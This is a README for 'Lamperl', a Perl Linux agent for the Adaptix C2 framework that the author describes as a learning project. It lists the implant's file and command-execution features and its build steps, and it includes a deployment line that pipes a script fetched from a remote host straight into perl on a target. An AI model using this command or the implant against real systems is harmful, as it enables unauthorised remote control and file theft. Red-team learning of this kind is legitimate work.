
Lamperl is a Linux agent for the Adaptix C2 written in Perl. It was created as a learning project and to gain experience developing for the Adaptix framework, and is documented more thoroughly in the following blog post.

[https://p0142.github.io/posts/lamperlpt3/](https://p0142.github.io/posts/lamperlpt3/)

I wouldn't actually use this in its current state, there's a lot of debug printing that exists to showcase how the traffic it's sending looks and how the communication flow works.

This is the v3 iteration, which can connect to the C2 server and handle `cd`, `pwd`, running commands asynchronously with `run`, and upload/download file operations with `upload` and `download`. The main focus of this iteration was adding a jobs system with proper integration with Adaptix, these use the `jobs list`, `jobs get` and `jobs kill` commands.

## Usage

| Command | Usage Example |
|---------|---------------|
| `cd` | `cd [{Path to change directory to}]` |
| `pwd` | `pwd` |
| `upload` | `upload {Local path to file} {Remote path to upload file}` |
| `download` | `download {Path to file}` |
| `run` | `run {Program to Execute} [{Arguments}]` |
| `jobs list` | `jobs list` |
| `jobs get` | `jobs get {Task ID} [{Tail}]` |
| `jobs kill` | `jobs kill {Task ID}` |

## Installation

### Prerequisites

- **Adaptix C2 Framework** installed and configured
- **Go 1.18+** for building extenders
- **Perl** with core modules

### Build & Install

1. **Build the HTTP Listener**:
   ```bash
   cd lamperl_listener_http
   make
   ```
   Copy `dist/` contents to `AdaptixC2/dist/extenders/lamperl_listener_http/`

2. **Build the Agent**:
   ```bash
   cd lamperl_agent
   make
   ```
   Copy `dist/` contents to `AdaptixC2/dist/extenders/lamperl_agent/`

3. **Register Extenders**:
   Edit `AdaptixC2/profile.json` and add:
   ```json
   "extenders": [
       "extenders/lamperl_listener_http/config.json",
       "extenders/lamperl_agent/config.json"
   ]
   ```

4. **Restart Adaptix C2**:
   The agent should be loaded automatically.


## Configuration

### Listener Configuration

Create a new HTTP listener in Adaptix with:
- **Bind Address**: Interface to listen on (0.0.0.0 for all)
- **Port**: TCP port for C2 communication (default: 8080)
- **Callback Address**: External IP:Port for agent connections
- **Api Path**: `/api/test`, The path the agent will beacon to.

### Agent Generation

1. In Adaptix create a lamperl listener
2. Right click the listener -> Generate Agent
3. Save the agent somewhere
4. Deploy `lamperl.pl` to target system, this can be done with by hosting the file on a web server, curl, and pipe:
```sh
curl http://192.168.50.50/lamperl.pl | perl
```


## Credits

- **Inspiration**: [PaperShell](https://github.com/ArturLukianov/PaperShell)
- **Framework**: [Adaptix C2](https://github.com/Adaptix-Framework)
- **AxScript Docs**: [AxScript](https://adaptix-framework.gitbook.io/adaptix-framework/development/axscript)
